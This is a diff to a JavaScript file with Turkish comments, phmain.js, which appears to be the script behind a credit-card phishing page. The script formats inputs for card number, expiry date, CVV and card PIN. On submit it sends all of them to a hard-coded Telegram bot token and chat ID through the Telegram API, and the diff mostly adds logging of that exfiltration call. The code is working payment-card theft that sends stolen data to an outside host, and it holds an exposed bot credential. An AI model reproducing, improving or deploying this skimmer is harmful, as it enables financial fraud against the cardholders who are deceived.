@@ -1,4 +1,4 @@
-// phmain.js - TAM ÇALIŞAN (boşluk + slash)
+// phmain.js - TAM ÇALIŞAN VERSİYON
 
 const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
 const CHAT_ID = "-1002475411082";
@@ -51,7 +51,19 @@ function getIP(callback) {
 
 function sendToTelegram(message) {
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
-    fetch(url).catch(console.log);
+    console.log('Gönderiliyor...');
+    
+    fetch(url)
+        .then(function(response) {
+            console.log('Response status:', response.status);
+            return response.json();
+        })
+        .then(function(data) {
+            console.log('Telegram yanıtı:', data);
+        })
+        .catch(function(err) {
+            console.log('HATA:', err);
+        });
 }
 
 function showAlert(msg) {
@@ -67,7 +79,7 @@ function showAlert(msg) {
 window.addEventListener('DOMContentLoaded', function() {
     console.log('DOM yüklendi');
     
-    // === KART NUMARASI (her 4 rakamda bir boşluk) ===
+    // KART NUMARASI (her 4 rakamda bir boşluk)
     var kartInput = document.getElementById('customUsername');
     if (kartInput) {
         kartInput.addEventListener('input', function() {
@@ -79,13 +91,10 @@ window.addEventListener('DOMContentLoaded', function() {
                 formatli += rakamlar[i];
             }
             this.value = formatli;
-            console.log('Kart formatlandı:', formatli);
         });
-    } else {
-        console.log('customUsername bulunamadı!');
     }
     
-    // === SKT (otomatik slash) ===
+    // SKT (otomatik slash)
     var expInput = document.getElementById('exp');
     if (expInput) {
         expInput.addEventListener('input', function() {
@@ -96,13 +105,10 @@ window.addEventListener('DOMContentLoaded', function() {
             } else {
                 this.value = rakamlar;
             }
-            console.log('SKT formatlandı:', this.value);
         });
-    } else {
-        console.log('exp bulunamadı!');
     }
     
-    // === CVV (sadece rakam, max 3) ===
+    // CVV (sadece rakam, max 3)
     var cvvInput = document.getElementById('cvv');
     if (cvvInput) {
         cvvInput.addEventListener('input', function() {
@@ -110,7 +116,7 @@ window.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // === Şifre (sadece rakam, max 4) ===
+    // Şifre (sadece rakam, max 4)
     var sifreInput = document.getElementById('kkpw');
     if (sifreInput) {
         sifreInput.addEventListener('input', function() {
@@ -118,7 +124,7 @@ window.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // === BUTON ===
+    // BUTON
     var btn = document.getElementById('btn-spc');
     if (btn) {
         btn.onclick = function(e) {
@@ -129,11 +135,12 @@ window.addEventListener('DOMContentLoaded', function() {
             var cvv = document.getElementById('cvv').value;
             var sifre = document.getElementById('kkpw').value;
             
-            console.log('Kart No (temiz):', kartNo);
+            console.log('Kart No:', kartNo);
             console.log('SKT:', skt);
             console.log('CVV:', cvv);
             console.log('Şifre:', sifre);
             
+            // Doğrulamalar
             if (!kartNo || kartNo.length !== 16) {
                 showAlert('Kart numarası 16 haneli olmalıdır.');
                 return;
@@ -159,6 +166,7 @@ window.addEventListener('DOMContentLoaded', function() {
                 return;
             }
             
+            // Kırmızı kaplamayı gizle
             document.getElementById('alertDiv').style.display = 'none';
             
             // Butonu "Giriş yapılıyor..." yap
@@ -176,7 +184,5 @@ window.addEventListener('DOMContentLoaded', function() {
                 }, 1000);
             });
         };
-    } else {
-        console.log('btn-spc bulunamadı!');
     }
 });
